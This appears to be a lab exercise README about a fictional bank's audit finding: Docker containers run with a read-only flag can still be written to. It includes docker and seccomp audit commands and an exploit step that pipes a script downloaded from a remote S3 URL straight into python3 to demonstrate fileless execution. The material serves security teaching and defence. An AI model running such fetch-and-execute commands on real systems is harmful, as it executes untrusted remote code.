# WhizCash Bank

WhizCash Bank had its annual security audit. The result was forwarded to you.

# Result of the External Security Audit

After the external security audit of the bank's infrastructure, a security vulnerability was found. Although the containers were started with the read-only flag, an auditor was able to write something to the file system.

You are now responsible for closing this security gap. In order to test the vulnerability, the auditor has provided you with a test exploit.

## How the exploit does work

The auditor gives you the following instructions on how the exploit can currently be executed:

> **_NOTE:_**  To see what happens, you have to activate an audit profile for seccomp provided here [audit.json](./profiles/audit.json).

Starting a container with read-only file system:

    sudo docker run --name fileless -d -it --rm --read-only --security-opt seccomp=[path-to-audit-json]/audit.json python:3.9.1

Run the following command to see which syscalls are executed

    sudo journalctl -f | grep audit

Now you are able to run the exploit provided by the auditor:

    sudo docker exec -it fileless curl -s https://sec4dev.s3.eu-central-1.amazonaws.com/output.py | python3

and you should see in the logs that there are various of syscalls executed e.g. openat.
